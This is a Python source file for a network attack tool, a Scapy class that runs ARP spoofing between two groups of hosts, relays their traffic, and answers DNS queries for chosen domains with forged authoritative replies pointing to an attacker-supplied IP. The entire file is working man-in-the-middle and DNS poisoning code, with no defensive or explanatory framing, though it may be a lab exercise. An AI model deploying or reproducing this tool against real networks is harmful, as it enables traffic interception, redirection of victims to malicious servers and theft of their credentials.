import sys
import time
import threading
from scapy.all import *
from ArpSpoofing import ArpSpoofing

class SilentDnsPoisoning:
    interface = 0
    def __init__(self, intFace):
        self.interface = intFace

    def doPoison(self, target1, target2, target1MAC, target2MAC, url, ipPoison, timeSleep):

        def makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison, interface):
            if pkt.haslayer(ARP):
                print("ARP packet: do not redirect")
            else:
                # if source is target 1 then someone from target 2 must be the true receiver
                if pkt[Ether].src in target1MAC:
                    print("Traffic from machine 1")
                    found = False
                    # find true receiver (the mac of true receiver)
                    receiver = pkt[IP].dst
                    for i in range(len(target2)):
                        if receiver == target2[i]:
                            # we are the source now cause target 2 thinks we are target 1
                            pkt[Ether].src = pkt[Ether].dst
                            # set the mac of the true receiver (someone from list target2)
                            pkt[Ether].dst = target2MAC[i]
                            found = True
                            break
                    # send the packet
                    if found:
                        if pkt.haslayer(DNS):
                            if pkt[DNS].qr == 0:
                                linkPresent = False
                                for link in url:
                                    # if we find a matching link do not resend the packet to its true receiver
                                    # but make a fake response query
                                    if link in pkt[DNS].qd.qname:
                                        linkPresent = True
                                        # for a response revert destination and source
                                        fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                                        fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                                        # fake query pointing the requested URL to the poison IP
                                        fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
                                        # fake DNS response
                                        fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
                                        # combine into complete packet
                                        poisonPacket = fakeIP / fakeUDP / fakeDNS
                                        # send the poison packet to the victim
                                        send(poisonPacket, verbose=0, iface=interface)
                                        print("Fake packet sent")
                                if linkPresent == False:
                                    # No link match -> resend the DNS request to its true receiver
                                    pkt[Ether].src = pkt[Ether].dst
                                    pkt[Ether].dst = target1MAC[i]
                                    send(pkt, iface=interface)
                            else:
                                # This is not a DNS request -> resend the packet to its true receiver
                                pkt[Ether].src = pkt[Ether].dst
                                pkt[Ether].dst = target1MAC[i]
                                send(pkt, iface=interface)
                        else:
                            # Packet doesn't have DNS layer -> resend the packet to its true receiver
                            pkt[Ether].src = pkt[Ether].dst
                            pkt[Ether].dst = target1MAC[i]
                            sendp(pkt, iface=interface)
                # same but with source target 2
                elif pkt[Ether].src in target2MAC:
                    print("Traffic from machine 2")
                    found = False
                    receiver = pkt[IP].dst
                    for i in range(len(target1)):
                        if receiver == target1[i]:
                            pkt[Ether].src = pkt[Ether].dst
                            pkt[Ether].dst = target1MAC[i]
                            found = True
                            break
                    if found:
                        if pkt.haslayer(DNS):
                            send(pkt, iface=interface)
                        else:
                            sendp(pkt, iface=interface)
        arpSpoofing = ArpSpoofing(self.interface)
        try:
            print("before thread")
            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof,
                                        args=(target1, target2, target1MAC, target2MAC, False, False, timeSleep))
            arpSpoof.daemon = True
            arpSpoof.start()
            print("after thread")
        except:
            print("Thread arp failed to start")

        while True:
            sniff(count=1, store=0,
                  prn=lambda pkt: makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison,
                                                 self.interface), iface=self.interface)